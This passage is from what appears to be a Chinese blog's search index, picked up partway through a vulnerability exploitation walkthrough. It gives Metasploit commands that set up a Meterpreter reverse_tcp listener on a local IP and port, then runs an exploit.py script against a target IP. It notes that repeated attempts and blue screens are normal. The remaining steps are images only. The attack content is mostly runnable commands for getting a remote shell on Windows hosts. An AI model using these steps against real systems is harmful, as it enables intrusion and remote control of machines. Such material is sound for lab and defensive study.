class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="4-运行exp"><a href="#4-运行exp" class="headerlink" title="4. 运行exp"></a>4. 运行exp</h3><p><code>python3 exploit.py -ip 192.168.20.128</code><br><img src="https://i.imgur.com/7NYgHXA.png"></p><p>如果失败，多试几十次，中间会蓝屏，等各种情况，属于正常行为</p><h3 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5. 命令执行"></a>5. 命令执行</h3><p><img src="/../img/image%205.webp"></p><h3 id="6-简易原理图"><a href="#6-简易原理图" class="headerlink" title="6. 简易原理图"></a>6. 简易原理图</h3><p><img src="/../img/Pasted%20image%2020240711201750.png"></p>]]></content>
      
      
      <categories>
          
          <category> 参考文档 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
